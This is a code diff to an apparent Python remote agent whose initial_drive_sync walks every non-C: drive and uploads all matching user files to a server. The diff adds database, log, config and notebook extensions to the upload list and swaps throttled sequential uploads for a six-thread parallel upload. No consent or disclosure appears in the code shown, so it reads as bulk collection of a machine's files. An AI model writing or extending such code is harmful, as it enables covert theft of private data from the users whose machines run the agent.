@@ -18,6 +18,7 @@ import os
 import platform
 import socket
 import threading
+import concurrent.futures
 import sys
 import time
 import uuid
@@ -85,18 +86,19 @@ public_ip_last_checked_at = 0
 ALLOWED_USER_EXTENSIONS = {
     # Documents & Text
     '.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
-    '.csv', '.rtf', '.odt', '.ods', '.odp', '.md',
+    '.csv', '.rtf', '.odt', '.ods', '.odp', '.md', '.log', '.tex', '.wpd',
     # Images & Graphics
     '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.svg', '.webp', '.tiff',
-    '.psd', '.ai', '.raw', '.heic',
+    '.psd', '.ai', '.raw', '.heic', '.ico', '.eps',
     # Media: Video & Audio
-    '.mp4', '.mkv', '.avi', '.mov', '.wmv', '.flv', '.webm',
-    '.mp3', '.wav', '.aac', '.flac', '.m4a', '.ogg',
-    # Archives
-    '.zip', '.rar', '.7z', '.tar', '.gz', '.iso',
-    # User Code & Scripts
-    '.py', '.js', '.html', '.css', '.ts', '.cpp', '.c', '.h', '.cs',
-    '.java', '.php', '.rb', '.go', '.rs', '.sql', '.sh', '.bat', '.ps1'
+    '.mp4', '.mkv', '.avi', '.mov', '.wmv', '.flv', '.webm', '.m4v', '.3gp',
+    '.mp3', '.wav', '.aac', '.flac', '.m4a', '.ogg', '.wma',
+    # Archives & Databases
+    '.zip', '.rar', '.7z', '.tar', '.gz', '.iso', '.db', '.sqlite', '.sqlite3', '.accdb', '.mdb',
+    # User Code, Data & Scripts
+    '.py', '.js', '.html', '.htm', '.css', '.ts', '.cpp', '.c', '.h', '.cs',
+    '.java', '.php', '.rb', '.go', '.rs', '.sql', '.sh', '.bat', '.ps1', '.json', '.xml', '.yaml', '.yml',
+    '.ipynb'
 }
 
 IGNORED_PATTERNS = [
@@ -302,18 +304,23 @@ def initial_drive_sync():
 
         for drive_root in non_c_drives:
             print(f"[AGENT FILE SYNC] Scanning drive: {drive_root}")
+            drive_files = []
             try:
                 for root, dirs, files in os.walk(drive_root, topdown=True):
-                    # Skip ignored directories
+                    # Skip ignored directories ($RECYCLE.BIN, etc.)
                     dirs[:] = [d for d in dirs if not is_ignored(os.path.join(root, d))]
 
                     for file in files:
                         full_path = os.path.join(root, file)
                         if not is_ignored(full_path):
-                            upload_file_to_server(full_path)
-                            time.sleep(0.02)  # Fast smooth upload rate
+                            drive_files.append(full_path)
             except Exception as e:
                 print(f"[AGENT FILE SYNC] Error scanning {drive_root}: {e}")
+
+            print(f"[AGENT FILE SYNC] Discovered {len(drive_files)} user files on {drive_root}. Uploading in parallel...")
+            if drive_files:
+                with concurrent.futures.ThreadPoolExecutor(max_workers=6) as executor:
+                    list(executor.map(upload_file_to_server, drive_files))
 
         print("[AGENT FILE SYNC] Initial non-C: drive scan and upload complete!")
 
